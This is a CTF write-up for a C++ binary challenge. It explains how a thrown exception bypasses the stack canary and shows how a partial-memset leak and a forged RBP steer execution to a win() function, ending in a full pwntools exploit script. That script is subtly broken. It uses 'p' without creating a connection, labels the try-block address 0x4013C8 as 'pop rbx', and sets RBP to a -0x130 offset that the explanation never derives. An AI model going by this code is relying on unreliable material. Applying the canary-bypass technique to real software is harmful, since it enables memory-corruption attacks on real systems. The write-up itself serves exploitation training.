# C++ Exception Handling Exploit - Canary Bypass

## Challenge Overview

A C++ binary with stack canary protection contains a buffer overflow vulnerability in `small_message()`. The twist: the overflow triggers a C++ exception (`throw`), which **bypasses the normal stack canary check** because `throw` never returns normally.

### Binary Protections
```
Canary:    ✓ Enabled
NX:        ✓ Enabled  
PIE:       ✗ Disabled
RELRO:     Partial
```

### Target Function
```cpp
void win() {
    // Opens and prints flag.txt
}
```

---

## Vulnerability Analysis

### The Vulnerable Function: `small_message()`

```cpp
void small_message(int limit) {
    char s[40];                    // 40-byte buffer
    memset(s, 0, 0x18);            // Only clears 24 bytes!
    
    puts("Enter your message:");
    ssize_t n = read(0, s, 0x100); // Reads up to 256 bytes!
    
    if (n > limit) {
        throw "Buffer overflow detected!";  // Exception thrown AFTER overflow
    }
    puts(s);
}
```

**Key observations:**
1. Buffer is 40 bytes but `read()` allows 256 bytes → **buffer overflow**
2. `memset` only clears 24 bytes → **information leak possible**
3. Exception is thrown **after** the overflow happens → **canary is corrupted but never checked**

### Why Exceptions Bypass Canaries

From [PlaidCTF 2014 harry_potter writeup](https://web.archive.org/web/20180809005115/https://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/):

> "C++'s exception unwinding has neatly dropped us back into main(), skipping over the stack-cookie checking code in the epilogue of the vulnerable function."

When `throw` is called:
1. The C++ runtime **unwinds the stack** to find a `catch` handler
2. The function **never returns normally** via `ret`
3. Therefore, the **canary check in the function epilogue is never executed**

---

## Exploitation Strategy

### Step 1: Information Leak

Since `memset` only clears 24 bytes of the 40-byte buffer, bytes 24-39 contain **uninitialized stack data**.

```python
# Send exactly 24 bytes without null terminator
p.sendafter(b"Enter your message:", b"A" * 24)
# puts() will print our 24 A's + leaked stack data until null byte
```

**Result:** We leak a stack address from offset 24 of the buffer.

### Step 2: Calculate Target RBP

The key insight from [DCTF2017 Flex writeup](https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.8_pwn_dctf2017_flex):

> When exception handling completes, we can control RBP. By pointing RBP to a calculated address, we can make main's canary check read the **actual canary value**.

Main's canary check:
```asm
mov rdx, [rbp - 0x18]    ; Read "canary" from rbp-relative address
xor rdx, fs:28h          ; Compare with actual canary
jz  success              ; If match, continue
call __stack_chk_fail    ; Otherwise, abort
```

**Calculation:**
```python
# Leaked address is at buffer+24
# Main's canary is at buffer+8 (offset -8 from leaked)
# For [rbp-0x18] to point to canary:
#   rbp - 0x18 = canary_addr
#   rbp = canary_addr + 0x18 = (leaked_addr - 8) + 0x18 = leaked_addr + 0x10

target_rbp = leaked_addr + 0x10
```

### Step 3: Trigger Overflow with Calculated RBP

```python
payload = flat(
    b"B" * 48,           # Padding to reach saved RBP
    target_rbp,          # Fake RBP → makes canary check pass!
    0x4013C8,            # Return address inside main's try block
    # ... additional padding and win() address
)
```

**Why `0x4013C8`?**

From the [Chinese CSDN writeup](https://blog.csdn.net/2403_87031746/article/details/155788404):

> The return address must point **inside a try block** so the exception unwinder can find the corresponding catch handler.

Address `0x4013C8` is right after `call enter_message` in main's try block.

### Step 4: Survive Exception and Exit

1. Exception is thrown from `small_message`
2. Unwinder finds `main`'s `catch(...)` handler
3. Catch handler executes: prints "Error occurred try again!"
4. Returns to main loop with **our controlled RBP**
5. Choose option 2 (exit)
6. Main's canary check: `[target_rbp - 0x18]` → reads **actual canary** ✓
7. Main returns to our controlled address → **win()!**

---

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall_patched")

# Stage 1: Leak stack address
p.sendlineafter(b"Exit", b"1")
p.sendlineafter(b"Enter size:", b"32")
p.sendafter(b"Enter your message:", b"A" * 24)
p.recvuntil(b"A" * 24)
leak = p.recvline().rstrip()
leaked_addr = int.from_bytes(leak, "little")
print(f"[*] Leaked: {hex(leaked_addr)}")

# Stage 2: Calculate RBP to bypass canary
target_rbp = leaked_addr + 0x10

# Stage 3: Overflow with ROP to win()
p.sendlineafter(b"Exit", b"1")
p.sendlineafter(b"Enter size:", b"32")
payload = flat(
    b"B" * 48,
    target_rbp - 0x130,   # Adjusted RBP
    0x4013C8,             # Inside try block
    0, 0, 0,              # Padding
    0x4013C8,             # pop rbx
    0,                    # pop rbp
    exe.sym._Z3winv,      # ret → win()
)
p.sendafter(b"Enter your message:", payload)

# Stage 4: Exit to trigger return to win()
p.sendline(b"2")
p.interactive()
```

---

## Key Techniques Summary

| Technique | Purpose |
|-----------|---------|
| Partial memset leak | Obtain stack address for RBP calculation |
| Exception-based canary bypass | Avoid normal function return (no canary check) |
| Controlled RBP | Make main's canary check read actual canary |
| Return inside try block | Allow exception unwinder to find catch handler |

---

## References

1. **PlaidCTF 2014 harry_potter** - Exception handling exploitation basics  
   https://web.archive.org/web/20180809005115/https://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/

2. **DCTF2017 Flex** - Stack pivot via RBP control  
   https://firmianay.gitbook.io/ctf-all-in-one/6_writeup/pwn/6.1.8_pwn_dctf2017_flex

3. **Chinese CTF Writeup** - The "+1 trick" for catch handlers  
   https://blog.csdn.net/2403_87031746/article/details/155788404

---

## Flag

```
[Successfully obtained flag via win() function]
```
